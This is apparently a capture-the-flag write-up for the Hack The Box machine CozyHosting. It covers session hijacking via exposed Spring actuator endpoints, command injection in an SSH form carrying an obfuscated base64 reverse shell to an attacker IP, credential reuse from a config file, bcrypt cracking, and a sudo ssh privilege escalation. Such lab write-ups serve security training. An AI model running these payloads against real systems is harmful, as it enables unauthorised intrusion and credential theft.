---
layout: post
title: Hack The Box - CozyHosting
date: 2023-09-03 11:29 +0200
image:
    path: /assets/img/posts/cozy-hosting/cozy-hosting-card.png
    alt: Cozy hosting card
categories: [Hack The Box]
tags: [Hack-The-Box-Easy, SSRF, OS command injection]
---

```
HOST: 10.10.11.230
```

## Tools used

-   [nmap](https://nmap.org/)

## Enumeration

### Nmap Scan

```bash
┌──(rether㉿rether)-[~]
└─$ nmap 10.10.11.230 -Pn -A
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 11:33 CEST
Nmap scan report for 10.10.11.230
Host is up (0.068s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
```

The nmap result shows an http server on tcp port 80.

### HTTP - Port 80

!["Cozy Hosting home page"](/assets/img/posts/cozy-hosting/cozy-hosting-home.png "Cozy Hosting home page")

With a bit of searching, we found several hidden routes with dirsearch:

```bash
┌──(rether㉿rether)
└─$ dirsearch -u http://cozyhosting.htb -e *

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: cloudhosting-0.0.1 | HTTP method: GET | Threads: 30 | Wordlist size: 9009

Output File: /home/rether/.dirsearch/reports/cozyhosting.htb/_23-09-07_13-27-16.txt

Error Log: /home/rether/.dirsearch/logs/errors-23-09-07_13-27-16.log

Target: http://cozyhosting.htb/

[13:27:17] Starting:
[13:27:37] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
[13:27:41] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[13:27:44] 400 -  435B  - /a%5c.aspx
[13:27:45] 200 -  634B  - /actuator
[13:27:45] 200 -   15B  - /actuator/health
[13:27:45] 200 -   48B  - /actuator/sessions
[13:27:45] 200 -    5KB - /actuator/env
[13:27:45] 200 -   10KB - /actuator/mappings
[13:27:46] 200 -  124KB - /actuator/beans
[13:27:47] 401 -   97B  - /admin
[13:28:20] 200 -    0B  - /engine/classes/swfupload//swfupload.swf
[13:28:20] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf
[13:28:20] 500 -   73B  - /error
[13:28:23] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[13:28:23] 200 -    0B  - /extjs/resources//charts.swf
[13:28:26] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf
[13:28:29] 200 -   12KB - /index
[13:28:36] 200 -    4KB - /login
[13:28:36] 200 -    0B  - /login.wdm%2e
[13:28:38] 204 -    0B  - /logout
[13:29:01] 400 -  435B  - /servlet/%C0%AE%C0%AE%C0%AF

Task Completed
```

To access the `/admin` route, we need to be logged in.

The `/actuator/sessions` shows us all current sessions with their status as `UNAUTHORIZED` or the name of the user who logged in.

!["Cozy Hosting actuator sessions"](/assets/img/posts/cozy-hosting/cozy-hosting-actuator-sessions.png "Cozy Hosting actuator sessions")

Thanks to the given session identifier, we can bypass the login to access the administration page.
We simply generate a session ID for each connection attempt. Then we can replace the session ID with a valid one:

```bash
GET /admin HTTP/1.1
Host: cozyhosting.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=5CAFEAAF09D68CF70BE061BFC9ED63A2 <-- change your session to one that is not 'UNAUTHORIZED' from '/actuator/sessions'.
Connection: close
```

!["Cozy Hosting admin page"](/assets/img/posts/cozy-hosting/cozy-hosting-admin-page.png "Cozy Hosting admin page")

In the footer of the administration page, we see a form that returns an `ssh` error by sending the host name without the username.

We can exploit this error to create reverse shell.

With this payload:

```bash
echo${IFS}"L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44LzQ0NDQgMD4mMQo="|base64${IFS}-d|bash;
```

In burpsuite:

```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
Content-Length: 319f
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://cozyhosting.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://cozyhosting.htb/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=E0EF6F803EC45A92B681E4939C10A127
Connection: close

host=10.10.16.8&username=%6b%61%6c%69%3b%65%63%68%6f%24%7b%49%46%53%7d%22%4c%32%4a%70%62%69%39%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%69%34%34%4c%7a%51%30%4e%44%51%67%4d%44%34%6d%4d%51%6f%3d%22%7c%62%61%73%65%36%34%24%7b%49%46%53%7d%2d%64%7c%62%61%73%68%3b
```

Now that we're in, we can get the name of the ssh user from the `/etc/passwd` file.

```
josh:x:1003:1003::/home/josh:/usr/bin/bash
```

In the `/app` folder, we've found a .jar file. Download it to your PC. This folder was the backend of the Cozyhosting website. In the `application.properties` file of `BOOT-INF/classes/` we have psql identifiers.

```
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

With these credentials, we can connect to the psql database.

```bash
psql "postgresql://postgres:Vg&nvzAQ7XxR@localhost/cozyhosting"
```

In this database we see two tables:

```bash
$ psql "postgresql://postgres:Vg&nvzAQ7XxR@localhost/cozyhosting"
\dt
         List of relations
 Schema | Name  | Type  |  Owner
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)
```

From the USERS table we get hashed password:

```text
SELECT * FROM USERS;
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

With hashcat, we can easily crack this hash with the following command:

```bash
┌──(rether㉿rether)
└─$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --show
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

We can now connect to ssh and obtain the user flag.

```bash
┌──(rether㉿rether)
└─$ ssh josh@10.10.11.230
josh@10.10.11.230's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)

-   Documentation: https://help.ubuntu.com
-   Management: https://landscape.canonical.com
-   Support: https://ubuntu.com/advantage

System information as of Thu Sep 7 12:42:55 PM UTC 2023

System load: 0.0
Usage of /: 54.7% of 5.42GB
Memory usage: 23%
Swap usage: 0%
Processes: 263
Users logged in: 0
IPv4 address for eth0: 10.10.11.230
IPv6 address for eth0: dead:beef::250:56ff:feb9:8b1a

[...]

Last login: Thu Sep 7 10:54:01 2023 from 10.10.16.8
josh@cozyhosting:~$ cat user.txt
[user-flag]
```

## Enumeration (for root flag)

Check the user permission

```
josh@cozyhosting:~$ sudo -l
[sudo] password for josh:
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

We see that we can run ssh as root. With a quick search on [gftobins](https://gtfobins.github.io) we found this command to escalate privileges:

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

We can therefore obtain the root flag.

```bash
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
[root-flag]
```

![Cozy hosting pwned card](/assets/img/posts/sau/sau-pwned-card.png "Cozy hosting pwned card")
